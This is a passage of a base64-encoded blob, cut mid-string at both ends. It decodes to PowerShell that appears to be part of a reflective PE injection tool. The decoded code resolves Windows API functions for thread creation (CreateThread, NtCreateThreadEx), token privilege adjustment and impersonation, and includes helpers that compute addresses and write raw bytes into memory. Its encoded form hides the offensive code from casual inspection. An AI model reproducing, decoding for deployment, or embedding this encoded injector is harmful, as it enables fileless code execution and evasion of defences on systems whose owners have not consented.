VUaHJlYWQKICAgICAgICAKICAgICAgICAkR2V0RXhpdENvZGVUaHJlYWRBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBHZXRFeGl0Q29kZVRocmVhZAogICAgICAgICRHZXRFeGl0Q29kZVRocmVhZERlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbSW50MzJdLk1ha2VCeVJlZlR5cGUoKSkgKFtCb29sXSkKICAgICAgICAkR2V0RXhpdENvZGVUaHJlYWQgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkR2V0RXhpdENvZGVUaHJlYWRBZGRyLCAkR2V0RXhpdENvZGVUaHJlYWREZWxlZ2F0ZSkKICAgICAgICAkV2luMzJGdW5jdGlvbnMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBHZXRFeGl0Q29kZVRocmVhZCAtVmFsdWUgJEdldEV4aXRDb2RlVGhyZWFkCiAgICAgICAgCiAgICAgICAgJE9wZW5UaHJlYWRUb2tlbkFkZHIgPSBHZXQtUHJvY0FkZHJlc3MgQWR2YXBpMzIuZGxsIE9wZW5UaHJlYWRUb2tlbgogICAgICAgICRPcGVuVGhyZWFkVG9rZW5EZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW1VJbnQzMl0sIFtCb29sXSwgW0ludFB0cl0uTWFrZUJ5UmVmVHlwZSgpKSAoW0Jvb2xdKQogICAgICAgICRPcGVuVGhyZWFkVG9rZW4gPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkT3BlblRocmVhZFRva2VuQWRkciwgJE9wZW5UaHJlYWRUb2tlbkRlbGVnYXRlKQogICAgICAgICRXaW4zMkZ1bmN0aW9ucyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIE9wZW5UaHJlYWRUb2tlbiAtVmFsdWUgJE9wZW5UaHJlYWRUb2tlbgogICAgICAgIAogICAgICAgICRHZXRDdXJyZW50VGhyZWFkQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgR2V0Q3VycmVudFRocmVhZAogICAgICAgICRHZXRDdXJyZW50VGhyZWFkRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoKSAoW0ludFB0cl0pCiAgICAgICAgJEdldEN1cnJlbnRUaHJlYWQgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkR2V0Q3VycmVudFRocmVhZEFkZHIsICRHZXRDdXJyZW50VGhyZWFkRGVsZWdhdGUpCiAgICAgICAgJFdpbjMyRnVuY3Rpb25zIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgR2V0Q3VycmVudFRocmVhZCAtVmFsdWUgJEdldEN1cnJlbnRUaHJlYWQKICAgICAgICAKICAgICAgICAkQWRqdXN0VG9rZW5Qcml2aWxlZ2VzQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBBZHZhcGkzMi5kbGwgQWRqdXN0VG9rZW5Qcml2aWxlZ2VzCiAgICAgICAgJEFkanVzdFRva2VuUHJpdmlsZWdlc0RlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbQm9vbF0sIFtJbnRQdHJdLCBbVUludDMyXSwgW0ludFB0cl0sIFtJbnRQdHJdKSAoW0Jvb2xdKQogICAgICAgICRBZGp1c3RUb2tlblByaXZpbGVnZXMgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkQWRqdXN0VG9rZW5Qcml2aWxlZ2VzQWRkciwgJEFkanVzdFRva2VuUHJpdmlsZWdlc0RlbGVnYXRlKQogICAgICAgICRXaW4zMkZ1bmN0aW9ucyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIEFkanVzdFRva2VuUHJpdmlsZWdlcyAtVmFsdWUgJEFkanVzdFRva2VuUHJpdmlsZWdlcwogICAgICAgIAogICAgICAgICRMb29rdXBQcml2aWxlZ2VWYWx1ZUFkZHIgPSBHZXQtUHJvY0FkZHJlc3MgQWR2YXBpMzIuZGxsIExvb2t1cFByaXZpbGVnZVZhbHVlQQogICAgICAgICRMb29rdXBQcml2aWxlZ2VWYWx1ZURlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtTdHJpbmddLCBbU3RyaW5nXSwgW0ludFB0cl0pIChbQm9vbF0pCiAgICAgICAgJExvb2t1cFByaXZpbGVnZVZhbHVlID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJExvb2t1cFByaXZpbGVnZVZhbHVlQWRkciwgJExvb2t1cFByaXZpbGVnZVZhbHVlRGVsZWdhdGUpCiAgICAgICAgJFdpbjMyRnVuY3Rpb25zIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgTG9va3VwUHJpdmlsZWdlVmFsdWUgLVZhbHVlICRMb29rdXBQcml2aWxlZ2VWYWx1ZQogICAgICAgIAogICAgICAgICRJbXBlcnNvbmF0ZVNlbGZBZGRyID0gR2V0LVByb2NBZGRyZXNzIEFkdmFwaTMyLmRsbCBJbXBlcnNvbmF0ZVNlbGYKICAgICAgICAkSW1wZXJzb25hdGVTZWxmRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludDMyXSkgKFtCb29sXSkKICAgICAgICAkSW1wZXJzb25hdGVTZWxmID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJEltcGVyc29uYXRlU2VsZkFkZHIsICRJbXBlcnNvbmF0ZVNlbGZEZWxlZ2F0ZSkKICAgICAgICAkV2luMzJGdW5jdGlvbnMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBJbXBlcnNvbmF0ZVNlbGYgLVZhbHVlICRJbXBlcnNvbmF0ZVNlbGYKICAgICAgICAKICAgICAgICAkTnRDcmVhdGVUaHJlYWRFeEFkZHIgPSBHZXQtUHJvY0FkZHJlc3MgTnREbGwuZGxsIE50Q3JlYXRlVGhyZWFkRXgKICAgICAgICAkTnRDcmVhdGVUaHJlYWRFeERlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLk1ha2VCeVJlZlR5cGUoKSwgW1VJbnQzMl0sIFtJbnRQdHJdLCBbSW50UHRyXSwgW0ludFB0cl0sIFtJbnRQdHJdLCBbQm9vbF0sIFtVSW50MzJdLCBbVUludDMyXSwgW1VJbnQzMl0sIFtJbnRQdHJdKSAoW1VJbnQzMl0pCiAgICAgICAgJE50Q3JlYXRlVGhyZWFkRXggPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkTnRDcmVhdGVUaHJlYWRFeEFkZHIsICROdENyZWF0ZVRocmVhZEV4RGVsZWdhdGUpCiAgICAgICAgJFdpbjMyRnVuY3Rpb25zIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgTnRDcmVhdGVUaHJlYWRFeCAtVmFsdWUgJE50Q3JlYXRlVGhyZWFkRXgKICAgICAgICAKICAgICAgICAkSXNXb3c2NFByb2Nlc3NBZGRyID0gR2V0LVByb2NBZGRyZXNzIEtlcm5lbDMyLmRsbCBJc1dvdzY0UHJvY2VzcwogICAgICAgICRJc1dvdzY0UHJvY2Vzc0RlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbQm9vbF0uTWFrZUJ5UmVmVHlwZSgpKSAoW0Jvb2xdKQogICAgICAgICRJc1dvdzY0UHJvY2VzcyA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRJc1dvdzY0UHJvY2Vzc0FkZHIsICRJc1dvdzY0UHJvY2Vzc0RlbGVnYXRlKQogICAgICAgICRXaW4zMkZ1bmN0aW9ucyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIElzV293NjRQcm9jZXNzIC1WYWx1ZSAkSXNXb3c2NFByb2Nlc3MKICAgICAgICAKICAgICAgICAkQ3JlYXRlVGhyZWFkQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBLZXJuZWwzMi5kbGwgQ3JlYXRlVGhyZWFkCiAgICAgICAgJENyZWF0ZVRocmVhZERlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbSW50UHRyXSwgW0ludFB0cl0sIFtJbnRQdHJdLCBbVUludDMyXSwgW1VJbnQzMl0uTWFrZUJ5UmVmVHlwZSgpKSAoW0ludFB0cl0pCiAgICAgICAgJENyZWF0ZVRocmVhZCA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRDcmVhdGVUaHJlYWRBZGRyLCAkQ3JlYXRlVGhyZWFkRGVsZWdhdGUpCiAgICAgICAgJFdpbjMyRnVuY3Rpb25zIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgQ3JlYXRlVGhyZWFkIC1WYWx1ZSAkQ3JlYXRlVGhyZWFkCiAgICAgICAgCiAgICAgICAgcmV0dXJuICRXaW4zMkZ1bmN0aW9ucwogICAgfQogICAgIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwoKICAgICAgICAgICAgCiAgICAjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCiAgICAjIyMjIyMjIyMjIyAgICBIRUxQRVJTICAgIyMjIyMjIyMjIyMjCiAgICAjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCgogICAgI1Bvd2Vyc2hlbGwgb25seSBkb2VzIHNpZ25lZCBhcml0aG1ldGljLCBzbyBpZiB3ZSB3YW50IHRvIGNhbGN1bGF0ZSBtZW1vcnkgYWRkcmVzc2VzIHdlIGhhdmUgdG8gdXNlIHRoaXMgZnVuY3Rpb24KICAgICNUaGlzIHdpbGwgYWRkIHNpZ25lZCBpbnRlZ2VycyBhcyBpZiB0aGV5IHdlcmUgdW5zaWduZWQgaW50ZWdlcnMgc28gd2UgY2FuIGFjY3VyYXRlbHkgY2FsY3VsYXRlIG1lbW9yeSBhZGRyZXNzZXMKICAgIEZ1bmN0aW9uIFN1Yi1TaWduZWRJbnRBc1Vuc2lnbmVkCiAgICB7CiAgICAgICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbSW50NjRdCiAgICAgICAgJFZhbHVlMSwKICAgICAgICAKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSwgTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtJbnQ2NF0KICAgICAgICAkVmFsdWUyCiAgICAgICAgKQogICAgICAgIAogICAgICAgIFtCeXRlW11dJFZhbHVlMUJ5dGVzID0gW0JpdENvbnZlcnRlcl06OkdldEJ5dGVzKCRWYWx1ZTEpCiAgICAgICAgW0J5dGVbXV0kVmFsdWUyQnl0ZXMgPSBbQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoJFZhbHVlMikKICAgICAgICBbQnl0ZVtdXSRGaW5hbEJ5dGVzID0gW0JpdENvbnZlcnRlcl06OkdldEJ5dGVzKFtVSW50NjRdMCkKCiAgICAgICAgaWYgKCRWYWx1ZTFCeXRlcy5Db3VudCAtZXEgJFZhbHVlMkJ5dGVzLkNvdW50KQogICAgICAgIHsKICAgICAgICAgICAgJENhcnJ5T3ZlciA9IDAKICAgICAgICAgICAgZm9yICgkaSA9IDA7ICRpIC1sdCAkVmFsdWUxQnl0ZXMuQ291bnQ7ICRpKyspCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRWYWwgPSAkVmFsdWUxQnl0ZXNbJGldIC0gJENhcnJ5T3ZlcgogICAgICAgICAgICAgICAgI1N1YiBieXRlcwogICAgICAgICAgICAgICAgaWYgKCRWYWwgLWx0ICRWYWx1ZTJCeXRlc1skaV0pCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJFZhbCArPSAyNTYKICAgICAgICAgICAgICAgICAgICAkQ2FycnlPdmVyID0gMQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRDYXJyeU92ZXIgPSAwCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgW1VJbnQxNl0kU3VtID0gJFZhbCAtICRWYWx1ZTJCeXRlc1skaV0KCiAgICAgICAgICAgICAgICAkRmluYWxCeXRlc1skaV0gPSAkU3VtIC1iYW5kIDB4MDBGRgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGVsc2UKICAgICAgICB7CiAgICAgICAgICAgIFRocm93ICJDYW5ub3Qgc3VidHJhY3QgYnl0ZWFycmF5cyBvZiBkaWZmZXJlbnQgc2l6ZXMiCiAgICAgICAgfQogICAgICAgIAogICAgICAgIHJldHVybiBbQml0Q29udmVydGVyXTo6VG9JbnQ2NCgkRmluYWxCeXRlcywgMCkKICAgIH0KICAgIAoKICAgIEZ1bmN0aW9uIEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkCiAgICB7CiAgICAgICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbSW50NjRdCiAgICAgICAgJFZhbHVlMSwKICAgICAgICAKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSwgTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtJbnQ2NF0KICAgICAgICAkVmFsdWUyCiAgICAgICAgKQogICAgICAgIAogICAgICAgIFtCeXRlW11dJFZhbHVlMUJ5dGVzID0gW0JpdENvbnZlcnRlcl06OkdldEJ5dGVzKCRWYWx1ZTEpCiAgICAgICAgW0J5dGVbXV0kVmFsdWUyQnl0ZXMgPSBbQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoJFZhbHVlMikKICAgICAgICBbQnl0ZVtdXSRGaW5hbEJ5dGVzID0gW0JpdENvbnZlcnRlcl06OkdldEJ5dGVzKFtVSW50NjRdMCkKCiAgICAgICAgaWYgKCRWYWx1ZTFCeXRlcy5Db3VudCAtZXEgJFZhbHVlMkJ5dGVzLkNvdW50KQogICAgICAgIHsKICAgICAgICAgICAgJENhcnJ5T3ZlciA9IDAKICAgICAgICAgICAgZm9yICgkaSA9IDA7ICRpIC1sdCAkVmFsdWUxQnl0ZXMuQ291bnQ7ICRpKyspCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICNBZGQgYnl0ZXMKICAgICAgICAgICAgICAgIFtVSW50MTZdJFN1bSA9ICRWYWx1ZTFCeXRlc1skaV0gKyAkVmFsdWUyQnl0ZXNbJGldICsgJENhcnJ5T3ZlcgoKICAgICAgICAgICAgICAgICRGaW5hbEJ5dGVzWyRpXSA9ICRTdW0gLWJhbmQgMHgwMEZGCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGlmICgoJFN1bSAtYmFuZCAweEZGMDApIC1lcSAweDEwMCkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkQ2FycnlPdmVyID0gMQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRDYXJyeU92ZXIgPSAwCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgZWxzZQogICAgICAgIHsKICAgICAgICAgICAgVGhyb3cgIkNhbm5vdCBhZGQgYnl0ZWFycmF5cyBvZiBkaWZmZXJlbnQgc2l6ZXMiCiAgICAgICAgfQogICAgICAgIAogICAgICAgIHJldHVybiBbQml0Q29udmVydGVyXTo6VG9JbnQ2NCgkRmluYWxCeXRlcywgMCkKICAgIH0KICAgIAoKICAgIEZ1bmN0aW9uIENvbXBhcmUtVmFsMUdyZWF0ZXJUaGFuVmFsMkFzVUludAogICAgewogICAgICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW0ludDY0XQogICAgICAgICRWYWx1ZTEsCiAgICAgICAgCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbSW50NjRdCiAgICAgICAgJFZhbHVlMgogICAgICAgICkKICAgICAgICAKICAgICAgICBbQnl0ZVtdXSRWYWx1ZTFCeXRlcyA9IFtCaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkVmFsdWUxKQogICAgICAgIFtCeXRlW11dJFZhbHVlMkJ5dGVzID0gW0JpdENvbnZlcnRlcl06OkdldEJ5dGVzKCRWYWx1ZTIpCgogICAgICAgIGlmICgkVmFsdWUxQnl0ZXMuQ291bnQgLWVxICRWYWx1ZTJCeXRlcy5Db3VudCkKICAgICAgICB7CiAgICAgICAgICAgIGZvciAoJGkgPSAkVmFsdWUxQnl0ZXMuQ291bnQtMTsgJGkgLWdlIDA7ICRpLS0pCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGlmICgkVmFsdWUxQnl0ZXNbJGldIC1ndCAkVmFsdWUyQnl0ZXNbJGldKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIHJldHVybiAkdHJ1ZQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZWlmICgkVmFsdWUxQnl0ZXNbJGldIC1sdCAkVmFsdWUyQnl0ZXNbJGldKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIHJldHVybiAkZmFsc2UKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBlbHNlCiAgICAgICAgewogICAgICAgICAgICBUaHJvdyAiQ2Fubm90IGNvbXBhcmUgYnl0ZSBhcnJheXMgb2YgZGlmZmVyZW50IHNpemUiCiAgICAgICAgfQogICAgICAgIAogICAgICAgIHJldHVybiAkZmFsc2UKICAgIH0KICAgIAoKICAgIEZ1bmN0aW9uIENvbnZlcnQtVUludFRvSW50CiAgICB7CiAgICAgICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbVUludDY0XQogICAgICAgICRWYWx1ZQogICAgICAgICkKICAgICAgICAKICAgICAgICBbQnl0ZVtdXSRWYWx1ZUJ5dGVzID0gW0JpdENvbnZlcnRlcl06OkdldEJ5dGVzKCRWYWx1ZSkKICAgICAgICByZXR1cm4gKFtCaXRDb252ZXJ0ZXJdOjpUb0ludDY0KCRWYWx1ZUJ5dGVzLCAwKSkKICAgIH0KCgogICAgRnVuY3Rpb24gR2V0LUhleAogICAgewogICAgICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgJFZhbHVlICNXZSB3aWxsIGRldGVybWluZSB0aGUgdHlwZSBkeW5hbWljYWxseQogICAgICAgICkKCiAgICAgICAgJFZhbHVlU2l6ZSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlNpemVPZihbVHlwZV0kVmFsdWUuR2V0VHlwZSgpKSAqIDIKICAgICAgICAkSGV4ID0gIjB4ezA6WCQoJFZhbHVlU2l6ZSl9IiAtZiBbSW50NjRdJFZhbHVlICNQYXNzaW5nIGEgSW50UHRyIHRvIHRoaXMgZG9lc24ndCB3b3JrIHdlbGwuIENhc3QgdG8gSW50NjQgZmlyc3QuCgogICAgICAgIHJldHVybiAkSGV4CiAgICB9CiAgICAKICAgIAogICAgRnVuY3Rpb24gVGVzdC1NZW1vcnlSYW5nZVZhbGlkCiAgICB7CiAgICAgICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICREZWJ1Z1N0cmluZywKICAgICAgICAKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSwgTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtTeXN0ZW0uT2JqZWN0XQogICAgICAgICRQRUluZm8sCiAgICAgICAgCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDIsIE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbSW50UHRyXQogICAgICAgICRTdGFydEFkZHJlc3MsCiAgICAgICAgCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gIkVuZEFkZHJlc3MiLCBQb3NpdGlvbiA9IDMsIE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbSW50UHRyXQogICAgICAgICRFbmRBZGRyZXNzLAogICAgICAgIAogICAgICAgIFtQYXJhbWV0ZXIoUGFyYW1ldGVyU2V0TmFtZSA9ICJTaXplIiwgUG9zaXRpb24gPSAzLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW0ludFB0cl0KICAgICAgICAkU2l6ZQogICAgICAgICkKICAgICAgICAKICAgICAgICBbSW50UHRyXSRGaW5hbEVuZEFkZHJlc3MgPSBbSW50UHRyXTo6WmVybwogICAgICAgIGlmICgkUHNDbWRsZXQuUGFyYW1ldGVyU2V0TmFtZSAtZXEgIlNpemUiKQogICAgICAgIHsKICAgICAgICAgICAgW0ludFB0cl0kRmluYWxFbmRBZGRyZXNzID0gW0ludFB0cl0oQWRkLVNpZ25lZEludEFzVW5zaWduZWQgKCRTdGFydEFkZHJlc3MpICgkU2l6ZSkpCiAgICAgICAgfQogICAgICAgIGVsc2UKICAgICAgICB7CiAgICAgICAgICAgICRGaW5hbEVuZEFkZHJlc3MgPSAkRW5kQWRkcmVzcwogICAgICAgIH0KICAgICAgICAKICAgICAgICAkUEVFbmRBZGRyZXNzID0gJFBFSW5mby5FbmRBZGRyZXNzCiAgICAgICAgCiAgICAgICAgaWYgKChDb21wYXJlLVZhbDFHcmVhdGVyVGhhblZhbDJBc1VJbnQgKCRQRUluZm8uUEVIYW5kbGUpICgkU3RhcnRBZGRyZXNzKSkgLWVxICR0cnVlKQogICAgICAgIHsKICAgICAgICAgICAgVGhyb3cgIlRyeWluZyB0byB3cml0ZSB0byBtZW1vcnkgc21hbGxlciB0aGFuIGFsbG9jYXRlZCBhZGRyZXNzIHJhbmdlLiAkRGVidWdTdHJpbmciCiAgICAgICAgfQogICAgICAgIGlmICgoQ29tcGFyZS1WYWwxR3JlYXRlclRoYW5WYWwyQXNVSW50ICgkRmluYWxFbmRBZGRyZXNzKSAoJFBFRW5kQWRkcmVzcykpIC1lcSAkdHJ1ZSkKICAgICAgICB7CiAgICAgICAgICAgIFRocm93ICJUcnlpbmcgdG8gd3JpdGUgdG8gbWVtb3J5IGdyZWF0ZXIgdGhhbiBhbGxvY2F0ZWQgYWRkcmVzcyByYW5nZS4gJERlYnVnU3RyaW5nIgogICAgICAgIH0KICAgIH0KICAgIAogICAgCiAgICBGdW5jdGlvbiBXcml0ZS1CeXRlc1RvTWVtb3J5CiAgICB7CiAgICAgICAgUGFyYW0oCiAgICAgICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb249MCwgTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgICAgICBbQnl0ZVtdXQogICAgICAgICAgICAkQnl0ZXMsCiAgICAgICAgICAgIAogICAgICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uPTEsIE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICAgICAgW0ludFB0cl0KICAgICAgICAgICAgJE1lbW9yeUFkZHJlc3MKICAgICAgICApCiAgICAKICAgICAgICBmb3IgKCRPZmZzZXQgPSAwOyAkT2Zmc2V0IC1sdCAkQnl0ZXMuTGVuZ3RoOyAkT2Zmc2V0KyspCiAgICAgICAgewogICAgICAgICAgICBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpXcml0ZUJ5dGUoJE1lbW9yeUFkZHJlc3MsICRPZmZzZXQsICRCeXRlc1skT2Zmc2V0XSkKICAgICAgICB9CiAgICB9CiAgICAKCiAgICAjRnVuY3Rpb24gd3JpdHRlbiBieSBNYXR0IEdyYWViZXIsIFR3aXR0ZXI6IEBtYXR0aWZlc3RhdGlvbiwgQmxvZzogaHR0cDovL3d3dy5leHBsb2l0LW1vbmRheS5jb20vCiAgICBGdW5jdGlvbiBHZXQtRGVsZWdhdGVUeXBlCiAgICB7CiAgICAgICAgUGFyYW0KICAgICAgICAoCiAgICAgICAgICAgIFtPdXRwdXRUeXBlKFtUeXBlXSldCiAgICAgICAgICAgIAogICAgICAgICAgICBbUGFyYW1ldGVyKCBQb3NpdGlvbiA9IDApXQogICAgICAgICAgICBbVHlwZVtdXQogICAgICAgICAgICAkUGFyYW1ldGVycyA9IChOZXctT2JqZWN0IFR5cGVbXSgwKSksCiAgICAgICAgICAgIAogICAgICAgICAgICBbUGFyYW1ldGVyKCBQb3NpdGlvbiA9IDEgKV0KICAgICAgICAgICAgW1R5cGVdCiAgICAgICAgICAgICRSZXR1cm5UeXBlID0gW1ZvaWRdCiAgICAgICAgKQoKICAgICAgICAkRG9tYWluID0gW0FwcERvbWFpbl06OkN1cnJlbnREb21haW4KICAgICAgICAkRHluQXNzZW1ibHkgPSBOZXctT2JqZWN0IFN5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5TmFtZSgnUmVmbGVjdGVkRGVsZWdhdGUnKQogICAgICAgICRBc3NlbWJseUJ1aWxkZXIgPSAkRG9tYWluLkRlZmluZUR5bmFtaWNBc3NlbWJseSgkRHluQXNzZW1ibHksIFtTeXN0ZW0uUmVmbGVjdGlvbi5FbWl0LkFzc2VtYmx5QnVpbGRlckFjY2Vzc106OlJ1bikKICAgICAgICAkTW9kdWxlQnVpbGRlciA9ICRBc3NlbWJseUJ1aWxkZXIuRGVmaW5lRHluYW1pY01vZHVsZSgnSW5NZW1vcnlNb2R1bGUnLCAkZmFsc2UpCiAgICAgICAgJFR5cGVCdWlsZGVyID0gJE1vZHVsZUJ1aWxkZXIuRGVmaW5lVHlwZSgnTXlEZWxlZ2F0ZVR5cGUnLCAnQ2xhc3MsIFB1YmxpYywgU2VhbGVkLCBBbnNpQ2xhc3MsIEF1dG9DbGFzcycsIFtTeXN0ZW0uTXVsdGljYXN0RGVsZWdhdGVdKQogICAgICAgICRDb25zdHJ1Y3RvckJ1aWxkZXIgPSAkVHlwZUJ1aWxkZXIuRGVmaW5lQ29uc3RydWN0b3IoJ1JUU3BlY2lhbE5hbWUsIEhpZGVCeVNpZywgUHVibGljJywgW1N5c3RlbS5SZWZsZWN0aW9uLkNhbGxpbmdDb252ZW50aW9uc106OlN0YW5kYXJkLCAkUGFyYW1ldGVycykKICAgICAgICAkQ29uc3RydWN0b3JCdWlsZGVyLlNldEltcGxlbWVudGF0aW9uRmxhZ3MoJ1J1bnRpbWUsIE1hbmFnZWQnKQogICAgICAgICRNZXRob2RCdWlsZGVyID0gJFR5cGVCdWlsZGVyLkRlZmluZU1ldGhvZCgnSW52b2tlJywgJ1B1YmxpYywgSGlkZUJ5U2lnLCBOZXdTbG90LCBWaXJ0dWFsJywgJFJldHVyblR5cGUsICRQYXJhbWV0ZXJzKQogICAgICAgICRNZXRob2RCdWlsZGVyLlNldEltcGxlbWVudGF0aW9uRmxhZ3MoJ1J1bnRpbWUsIE1hbmFnZWQnKQogICAgICAgIAogICAgICAgIFdyaXRlLU91dHB1dCAkVHlwZUJ1aWxkZXIuQ3JlYXRlVHlwZSgpCiAgICB9CgoKICAgICNGdW5jdGlvbiB3cml0dGVuIGJ5IE1hdHQgR3JhZWJlciwgVHdpdHRlcjogQG1hdHRpZmVzdGF0aW9uLCBCbG9nOiBodHRwOi8vd3d3L